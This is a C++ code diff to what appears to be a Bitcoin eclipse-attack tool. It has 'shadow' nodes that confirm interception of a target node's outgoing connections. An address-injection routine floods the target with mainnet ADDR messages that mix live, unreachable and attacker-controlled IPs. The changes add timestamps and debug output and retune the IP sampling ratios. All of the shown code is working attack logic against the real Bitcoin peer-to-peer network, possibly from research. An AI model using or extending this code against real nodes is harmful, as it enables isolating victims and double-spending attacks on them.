@@ -260,12 +260,16 @@ void BitcoinNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                 if (_type == NodeType::Shadow && !_informed) {
 
                     // print attack success message
+                    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+                    std::string s(21, '\0');
+                    std::strftime(&s[0], s.size(), "%Y-%m-%d %H:%M:%S", std::localtime(&now));
                     cout
                             << "Interception of target node's outgoing connection is confirmed"
-                            << ", Shadow NodeIP:" << GetIP() << "\n";
+                            << ", Shadow NodeIP:" << GetIP() << " " << s << "\n";
                     // update attack statistics
                     _attackStat->IncrementHijackedOutgoingConnNum();
                     _informed = true;
+
                 }
             }
 
@@ -291,23 +295,27 @@ void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::du
     vector<string> &vReachableIP = _ipdb->GetVReachableIP();
     vector<string> &vUnreachIP = _ipdb->GetVUnreachableIP();
     vector<string> &vShadowIP = _ipdb->GetVShadowIP();
-
+    set<string> &sAliveIP = _ipdb->GetSAliveIP();
     vector<string> vAddr;
 
     if (now < attack_start_time) {
         // if it's prepare phase
+        std::cout<<"[injection - prepare] ";
         int totalIPCount = 1000;
-        int legiIPcount = totalIPCount * 0.3;
-        int unreLegiIPcount = totalIPCount * 0.7;
+        int legiIPcount = totalIPCount * 0.7;
+        int unreLegiIPcount = totalIPCount * 0.3;
 
-        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        legiIPcount = min(legiIPcount, (int) sAliveIP.size());
         unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
+        std::cout<<"Alive IP: "<<legiIPcount<<" / unreachable IP: "<<unreLegiIPcount;
         if (!vReachableIP.empty())
-            sample(vReachableIP.begin(), vReachableIP.end(), back_inserter(vAddr), legiIPcount,
+            sample(sAliveIP.begin(), sAliveIP.end(), back_inserter(vAddr), legiIPcount,
                    mt19937{random_device{}()});
+        std::cout<<" sampled reachable IP ";
         if (!vUnreachIP.empty())
             sample(vUnreachIP.begin(), vUnreachIP.end(), back_inserter(vAddr), unreLegiIPcount,
                    mt19937{random_device{}()});
+        std::cout<<"sampled unreachable IP \n";
     } else {
         // if it's attack phase
         int totalIPCount = std::min(1000, (int) (periodLength * ipPerSec));
@@ -315,12 +323,12 @@ void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::du
         int unreLegiIPcount = totalIPCount * (1 - shadowRate) * 0.7;
         int shadowIPcount = totalIPCount * shadowRate;
 
-        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        legiIPcount = min(legiIPcount, (int) sAliveIP.size());
         unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
         shadowIPcount = min(shadowIPcount, (int) vShadowIP.size());
 
         if (!vReachableIP.empty())
-            std::sample(vReachableIP.begin(), vReachableIP.end(), std::back_inserter(vAddr), legiIPcount,
+            std::sample(sAliveIP.begin(), sAliveIP.end(), std::back_inserter(vAddr), legiIPcount,
                         std::mt19937{std::random_device{}()});
         if (!vUnreachIP.empty())
             std::sample(vUnreachIP.begin(), vUnreachIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
@@ -334,9 +342,12 @@ void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::du
     }
 
     // assume a single data socket
+    if(_mTCPControl.size() != 1) {
+        std::cout<<"mTCPControl size assertion failed: should be 1, actually "<<_mTCPControl.size();
+    }
     assert(_mTCPControl.size() == 1);
     int data_fd = _mTCPControl.begin()->first;
-
+    std::cout<<"assumed single data socket ... ";
     // Create a ADDR message for `vIP`,
     // then push it to message queue
     const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9
@@ -348,11 +359,10 @@ void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::du
         struct in_addr in_addr_ip;
         in_addr_ip.s_addr = inet_addr(ip.c_str());
         CAddress addr = CAddress(CService(CNetAddr(in_addr_ip), 8333), nLocalNodeServices);
-
         vCAddr.push_back(addr);
     }
     CSerializedNetMsg msg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vCAddr);
-
+    std::cout<<"generated msg ... ";
     size_t nMessageSize = msg.data.size();
 //    size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
     LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);
@@ -364,9 +374,12 @@ void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::du
     memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);
 
     CVectorWriter{SER_NETWORK, PROTOCOL_VERSION, serializedHeader, 0, hdr};
-
+    std::cout<<"serialized msg ... ";
     SendMsg(data_fd, serializedHeader);
+    std::cout<<"sent msg header ...";
     if (nMessageSize) {
         SendMsg(data_fd, msg.data);
+        std::cout<<"sent msg data ... ";
     }
+    std::cout<<"done!\n";
 }
